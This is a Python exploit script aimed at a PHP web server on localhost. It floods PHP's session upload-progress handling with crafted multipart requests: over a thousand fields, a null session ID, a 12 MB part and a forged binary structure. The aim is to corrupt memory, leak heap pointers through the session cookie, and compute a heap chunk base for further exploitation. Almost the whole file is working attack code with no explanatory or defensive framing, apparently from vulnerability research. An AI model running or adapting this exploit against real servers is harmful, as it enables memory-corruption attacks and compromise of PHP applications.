import sys, time, struct
from collections import Counter
sys.path.insert(0, r"C:\Users\likat\p2s52704")
from exploit import Target, build_multipart, parse_cookie, chunk_base_from_cookie

port = sys.argv[1] if len(sys.argv) > 1 else "18101"
t = Target(f"http://127.0.0.1:{port}/index.php", timeout=120, verbose=False)
SID = b"attacksessionid0001"

def filepart(): return {"name": "f", "filename": "a.txt", "data": b"A" * 64}

def rotate():
    parts = [{"name": f"f{i:04d}"[:5], "data": b"V" * 3000} for i in range(1001)]
    parts += [{"name": "PHPSESSID", "data": b"\x00"}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}, filepart(), {"name": "big", "data": b"B" * (12 * 1024 * 1024)}]
    t.post(build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=120)
    time.sleep(0.3)
    parts = [{"name": "PHPSESSID", "data": SID}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
    t.post(build_multipart(parts, b"BNDRY12345"), b"BNDRY12345", read_cap=65536, timeout=20)
    time.sleep(0.5)

def try_once():
    rotate()
    parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
    parts += [{"name": "PHPSESSID", "data": b"\x00"}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}, filepart(), {"name": "big", "data": b"B" * (12 * 1024 * 1024)}]
    r = t.post(build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=120)
    body = r.split(b"\r\n\r\n", 1)[1] if b"\r\n\r\n" in r else r
    oom = b"Allowed memory size" in r
    time.sleep(0.2)
    parts = [{"name": "PHPSESSID", "data": SID}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
    for i in range(841):
        parts.append({"name": str(1000 + i), "data": (f"v{i:04d}" + "x" * 44)[:48].encode()})
    forge = bytearray(b"A" * 79); struct.pack_into("<Q", forge, 0x10, 0x1000); forge[0x18] = ord("L")
    parts.append({"name": "1999", "data": bytes(forge)})
    resp = t.post(build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20)
    return oom, resp

best = None
for i in range(5):
    oom, resp = try_once()
    raw = parse_cookie(resp)
    print(f"\n--- attempt {i+1}: OOM={oom} resp_len={len(resp)} cookie_len={len(raw) if raw else 0}")
    if not raw:
        print("    no cookie (PHPSESSID not leaked)")
        continue
    # hexdump first 128 bytes
    print("    raw[:64] hex:", raw[:64].hex())
    # analyze 8-byte little-endian values
    vals = [int.from_bytes(raw[j:j+8], "little") for j in range(0, len(raw) - 8, 8)]
    ptrs = [v for v in vals if v > 0x10000000000]
    print(f"    total 8B vals={len(vals)} heap_ptrs={len(ptrs)}")
    # most common raw values
    cnt = Counter(vals)
    print("    top raw values:")
    for v, c in cnt.most_common(5):
        print(f"      0x{v:x}  x{c}")
    # most common at various alignments
    for name, mask in [("2MB", ~0x1FFFFF), ("1MB", ~0xFFFFF), ("256KB", ~0x3FFFF), ("64KB", ~0xFFFF)]:
        ac = Counter((v & mask) for v in ptrs)
        if ac:
            top_v, top_c = ac.most_common(1)[0]
            print(f"    {name} align: top=0x{top_v:x} x{top_c} (distinct={len(ac)})")
    cb = chunk_base_from_cookie(raw)
    print(f"    chunk_base_from_cookie -> {hex(cb) if cb else None}")
    if cb:
        best = cb

print("\n=== BEST chunk base:", hex(best) if best else "NONE", "===")
